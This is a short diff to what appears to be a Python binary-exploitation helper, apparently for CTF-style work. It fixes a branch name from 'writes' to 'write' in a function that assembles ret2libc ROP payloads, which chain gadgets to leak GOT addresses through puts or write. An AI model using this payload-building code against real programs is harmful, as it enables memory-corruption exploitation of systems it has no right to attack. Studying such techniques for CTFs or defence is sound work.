@@ -43,7 +43,7 @@ def ret2libc_A(tool:str,to_leak:str,next:int,fill2ret,loader,fmt_str=0):
         if tool == "puts":
             payload = fill2ret+psize(pop_rdi_ret)+psize(elf.got[to_leak])+\
                       psize(elf.plt[tool])+psize(next)
-        elif tool == "writes":
+        elif tool == "write":
             payload = fill2ret+psize(pop_rdi_ret)+psize(1)+\
                       psize(pop_rsi_r15_ret)+psize(elf.got[to_leak])+psize(0)+\
                       psize(elf.plt[tool])+psize(next)
